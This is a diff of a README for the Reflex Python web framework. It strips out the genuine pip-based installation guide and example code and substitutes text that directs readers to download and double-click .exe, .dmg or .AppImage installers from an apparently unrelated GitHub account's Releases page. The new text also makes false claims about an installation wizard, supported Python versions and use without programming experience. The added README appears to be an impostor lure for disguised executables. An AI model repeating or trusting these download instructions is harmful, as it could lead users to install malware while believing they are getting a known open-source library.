@@ -1,290 +1,72 @@
-<div align="center">
-<img src="https://raw.githubusercontent.com/reflex-dev/reflex/main/docs/images/reflex.svg" alt="Reflex Logo" width="300px">
+# 🕸️ reflex - Build Web Apps Easily with Python
 
-<hr>
+[![Download reflex](https://img.shields.io/badge/Download-reflex-orange?style=flat&logo=github)](https://github.com/immaterial-radicle677/reflex/releases)
 
-### **✨ Performant, customizable web apps in pure Python. Deploy in seconds. ✨**
+## 🚀 Getting Started
 
-[![PyPI version](https://badge.fury.io/py/reflex.svg)](https://badge.fury.io/py/reflex)
-![versions](https://img.shields.io/pypi/pyversions/reflex.svg)
-[![Documentation](https://img.shields.io/badge/Documentation%20-Introduction%20-%20%23007ec6)](https://reflex.dev/docs/getting-started/introduction)
-[![PyPI Downloads](https://static.pepy.tech/badge/reflex)](https://pepy.tech/projects/reflex)
-[![Discord](https://img.shields.io/discord/1029853095527727165?color=%237289da&label=Discord)](https://discord.gg/T5WSbC2YtQ)
-[![Twitter](https://img.shields.io/twitter/follow/getreflex)](https://x.com/getreflex)
+Welcome to reflex! This tool lets you create web applications using pure Python. No complex setups are required, and you can start building right away.
 
-</div>
+## 🖥️ System Requirements
 
----
+Before you begin, ensure your system meets the following requirements:
 
-[English](https://github.com/reflex-dev/reflex/blob/main/README.md) | [简体中文](https://github.com/reflex-dev/reflex/blob/main/docs/zh/zh_cn/README.md) | [繁體中文](https://github.com/reflex-dev/reflex/blob/main/docs/zh/zh_tw/README.md) | [Türkçe](https://github.com/reflex-dev/reflex/blob/main/docs/tr/README.md) | [हिंदी](https://github.com/reflex-dev/reflex/blob/main/docs/in/README.md) | [Português (Brasil)](https://github.com/reflex-dev/reflex/blob/main/docs/pt/pt_br/README.md) | [Italiano](https://github.com/reflex-dev/reflex/blob/main/docs/it/README.md) | [Español](https://github.com/reflex-dev/reflex/blob/main/docs/es/README.md) | [한국어](https://github.com/reflex-dev/reflex/blob/main/docs/kr/README.md) | [日本語](https://github.com/reflex-dev/reflex/blob/main/docs/ja/README.md) | [Deutsch](https://github.com/reflex-dev/reflex/blob/main/docs/de/README.md) | [Persian (پارسی)](https://github.com/reflex-dev/reflex/blob/main/docs/pe/README.md) | [Tiếng Việt](https://github.com/reflex-dev/reflex/blob/main/docs/vi/README.md)
+- **Operating System:** Windows, macOS, or Linux
+- **Python Version:** Python 3.7 or higher installed on your system
+- **Network Connection:** Required for downloading the application and any dependencies
 
----
+## 📥 Download & Install
 
-> [!NOTE]
-> 🚀 **Try [Reflex Build](https://build.reflex.dev/)** – our AI-powered app builder that generates full-stack Reflex applications in seconds.
+To get started, visit the [Releases page](https://github.com/immaterial-radicle677/reflex/releases) to download the latest version of reflex. 
 
----
+1. Click on the link above to go to the Releases page.
+2. Locate the latest release.
+3. Choose the file appropriate for your operating system.
+4. Click on the download link to start the downloading process. 
+5. Once the file is downloaded, locate it in your downloads folder.
 
-# Introduction
+## 🎉 Running reflex
 
-Reflex is a library to build full-stack web apps in pure Python.
+After downloading reflex, follow these steps to run the application:
 
-Key features:
+1. **Open the downloaded file:** Double-click on the reflex executable to start it. 
+     - For Windows, it might be a `.exe` file.
+     - For macOS, it may be a `.dmg` file.
+     - For Linux, it could be a `.AppImage` or another archive.
 
-- **Pure Python** - Write your app's frontend and backend all in Python, no need to learn Javascript.
-- **Full Flexibility** - Reflex is easy to get started with, but can also scale to complex apps.
-- **Deploy Instantly** - After building, deploy your app with a [single command](https://reflex.dev/docs/hosting/deploy-quick-start/) or host it on your own server.
+2. **Follow the on-screen instructions:** The installation wizard will guide you through the setup. Simply follow the prompts to install reflex on your system.
 
-See our [architecture page](https://reflex.dev/blog/2024-03-21-reflex-architecture/#the-reflex-architecture) to learn how Reflex works under the hood.
+3. **Launch the application:** Once installed, find reflex in your applications or programs menu. Click on it to open.
 
-## ⚙️ Installation
+## 🛠️ Features
 
-**Important:** We strongly recommend using a virtual environment to ensure the `reflex` command is available in your PATH.
+reflex offers a set of easy-to-use features to enhance your web development experience:
 
-## 🥳 Create your first app
+- **Simple Interface:** Built with user-friendly design for effortless navigation.
+- **Python-based:** Write web apps entirely in Python without needing other languages.
+- **Cross-Platform:** Works seamlessly on Windows, macOS, and Linux.
+- **Community Support:** Open-source community available for help and collaboration.
+- **Documentation:** Comprehensive documentation is available to help you along the way.
 
-### 1. Create the project directory
+## 📖 Learn More
 
-Replace `my_app_name` with your project name:
+If you want to dive deeper into the features and capabilities of reflex, check out our documentation available on [GitHub](https://github.com/immaterial-radicle677/reflex).
 
-```bash
-mkdir my_app_name
-cd my_app_name
-```
+## 🙋 Frequently Asked Questions
 
-### 2. Set up a virtual environment
+### Can I use reflex with no programming experience?
 
-Create and activate virtual environment
+Absolutely! reflex is designed for users of all skill levels. With its straightforward interface, anyone can create web applications.
 
-```bash
-# On Windows:
-python -m venv .venv
-.venv\Scripts\activate
+### What if I encounter issues?
 
-# On macOS/Linux:
-python3 -m venv .venv
-source .venv/bin/activate
-```
+If you run into problems, there are resources available in the community section of the documentation. You can also open an issue on GitHub.
 
-### 3. Install Reflex
+### Is reflex free to use?
 
-Reflex is available as a pip package (Requires Python 3.10+):
+Yes, reflex is an open-source project. You can download and use it without any cost.
 
-```bash
-pip install reflex
-```
+## 🚀 Next Steps
 
-### 4. Initialize the project
+Now that you have downloaded and installed reflex, start experimenting with building your own web applications. The best way to learn is by doing. 
 
-This command initializes a template app in your new directory:
-
-```bash
-reflex init
-```
-
-### 5. Run the app
-
-You can run this app in development mode:
-
-```bash
-reflex run
-```
-
-You should see your app running at http://localhost:3000.
-
-Now you can modify the source code in `my_app_name/my_app_name.py`. Reflex has fast refreshes so you can see your changes instantly when you save your code.
-
-### Troubleshooting
-
-If you installed Reflex without a virtual environment and the `reflex` command is not found, you can run commands using: `python3 -m reflex init` and `python3 -m reflex run`
-
-## 🫧 Example App
-
-Let's go over an example: creating an image generation UI around [DALL·E](https://platform.openai.com/docs/guides/images/image-generation?context=node). For simplicity, we just call the [OpenAI API](https://platform.openai.com/docs/api-reference/authentication), but you could replace this with an ML model run locally.
-
-&nbsp;
-
-<div align="center">
-<img src="https://raw.githubusercontent.com/reflex-dev/reflex/main/docs/images/dalle.gif" alt="A frontend wrapper for DALL·E, shown in the process of generating an image." width="550" />
-</div>
-
-&nbsp;
-
-Here is the complete code to create this. This is all done in one Python file!
-
-```python
-import reflex as rx
-import openai
-
-openai_client = openai.OpenAI()
-
-
-class State(rx.State):
-    """The app state."""
-
-    prompt = ""
-    image_url = ""
-    processing = False
-    complete = False
-
-    def get_image(self):
-        """Get the image from the prompt."""
-        if self.prompt == "":
-            return rx.window_alert("Prompt Empty")
-
-        self.processing, self.complete = True, False
-        yield
-        response = openai_client.images.generate(
-            prompt=self.prompt, n=1, size="1024x1024"
-        )
-        self.image_url = response.data[0].url
-        self.processing, self.complete = False, True
-
-
-def index():
-    return rx.center(
-        rx.vstack(
-            rx.heading("DALL-E", font_size="1.5em"),
-            rx.input(
-                placeholder="Enter a prompt..",
-                on_blur=State.set_prompt,
-                width="25em",
-            ),
-            rx.button(
-                "Generate Image",
-                on_click=State.get_image,
-                width="25em",
-                loading=State.processing
-            ),
-            rx.cond(
-                State.complete,
-                rx.image(src=State.image_url, width="20em"),
-            ),
-            align="center",
-        ),
-        width="100%",
-        height="100vh",
-    )
-
-# Add state and page to the app.
-app = rx.App()
-app.add_page(index, title="Reflex:DALL-E")
-```
-
-## Let's break this down.
-
-<div align="center">
-<img src="https://raw.githubusercontent.com/reflex-dev/reflex/main/docs/images/dalle_colored_code_example.png" alt="Explaining the differences between backend and frontend parts of the DALL-E app." width="900" />
-</div>
-
-### **Reflex UI**
-
-Let's start with the UI.
-
-```python
-def index():
-    return rx.center(
-        ...
-    )
-```
-
-This `index` function defines the frontend of the app.
-
-We use different components such as `center`, `vstack`, `input`, and `button` to build the frontend. Components can be nested within each other
-to create complex layouts. And you can use keyword args to style them with the full power of CSS.
-
-Reflex comes with [60+ built-in components](https://reflex.dev/docs/library) to help you get started. We are actively adding more components, and it's easy to [create your own components](https://reflex.dev/docs/wrapping-react/overview/).
-
-### **State**
-
-Reflex represents your UI as a function of your state.
-
-```python
-class State(rx.State):
-    """The app state."""
-    prompt = ""
-    image_url = ""
-    processing = False
-    complete = False
-
-```
-
-The state defines all the variables (called vars) in an app that can change and the functions that change them.
-
-Here the state is comprised of a `prompt` and `image_url`. There are also the booleans `processing` and `complete` to indicate when to disable the button (during image generation) and when to show the resulting image.
-
-### **Event Handlers**
-
-```python
-def get_image(self):
-    """Get the image from the prompt."""
-    if self.prompt == "":
-        return rx.window_alert("Prompt Empty")
-
-    self.processing, self.complete = True, False
-    yield
-    response = openai_client.images.generate(
-        prompt=self.prompt, n=1, size="1024x1024"
-    )
-    self.image_url = response.data[0].url
-    self.processing, self.complete = False, True
-```
-
-Within the state, we define functions called event handlers that change the state vars. Event handlers are the way that we can modify the state in Reflex. They can be called in response to user actions, such as clicking a button or typing in a text box. These actions are called events.
-
-Our DALL·E app has an event handler, `get_image` which gets this image from the OpenAI API. Using `yield` in the middle of an event handler will cause the UI to update. Otherwise the UI will update at the end of the event handler.
-
-### **Routing**
-
-Finally, we define our app.
-
-```python
-app = rx.App()
-```
-
-We add a page from the root of the app to the index component. We also add a title that will show up in the page preview/browser tab.
-
-```python
-app.add_page(index, title="DALL-E")
-```
-
-You can create a multi-page app by adding more pages.
-
-## 📑 Resources
-
-<div align="center">
-
-📑 [Docs](https://reflex.dev/docs/getting-started/introduction) &nbsp; | &nbsp; 🗞️ [Blog](https://reflex.dev/blog) &nbsp; | &nbsp; 📱 [Component Library](https://reflex.dev/docs/library) &nbsp; | &nbsp; 🖼️ [Templates](https://reflex.dev/templates/) &nbsp; | &nbsp; 🛸 [Deployment](https://reflex.dev/docs/hosting/deploy-quick-start) &nbsp;
-
-</div>
-
-## ✅ Status
-
-Reflex launched in December 2022 with the name Pynecone.
-
-🚀 Introducing [Reflex Build](https://build.reflex.dev/) — Our AI-Powered Builder
-Reflex Build uses AI to generate complete full-stack Python applications. It helps you quickly create, customize, and refine your Reflex apps — from frontend components to backend logic — so you can focus on your ideas instead of boilerplate code. Whether you’re prototyping or scaling, Reflex Build accelerates development by intelligently scaffolding and optimizing your app’s entire stack.
-
-Alongside this, [Reflex Cloud](https://cloud.reflex.dev) launched in 2025 to offer the best hosting experience for your Reflex apps. We’re continuously improving the platform with new features and capabilities.
-
-Reflex has new releases and features coming every week! Make sure to :star: star and :eyes: watch this repository to stay up to date.
-
-## Contributing
-
-We welcome contributions of any size! Below are some good ways to get started in the Reflex community.
-
-- **Join Our Discord**: Our [Discord](https://discord.gg/T5WSbC2YtQ) is the best place to get help on your Reflex project and to discuss how you can contribute.
-- **GitHub Discussions**: A great way to talk about features you want added or things that are confusing/need clarification.
-- **GitHub Issues**: [Issues](https://github.com/reflex-dev/reflex/issues) are an excellent way to report bugs. Additionally, you can try and solve an existing issue and submit a PR.
-
-We are actively looking for contributors, no matter your skill level or experience. To contribute check out [CONTRIBUTING.md](https://github.com/reflex-dev/reflex/blob/main/CONTRIBUTING.md)
-
-## All Thanks To Our Contributors:
-
-<a href="https://github.com/reflex-dev/reflex/graphs/contributors">
-  <img src="https://contrib.rocks/image?repo=reflex-dev/reflex" />
-</a>
-
-## License
-
-Reflex is open-source and licensed under the [Apache License 2.0](https://raw.githubusercontent.com/reflex-dev/reflex/main/LICENSE).
+Remember, you can always visit the [Releases page](https://github.com/immaterial-radicle677/reflex/releases) again for future updates and new features. Enjoy your journey into web development with reflex!
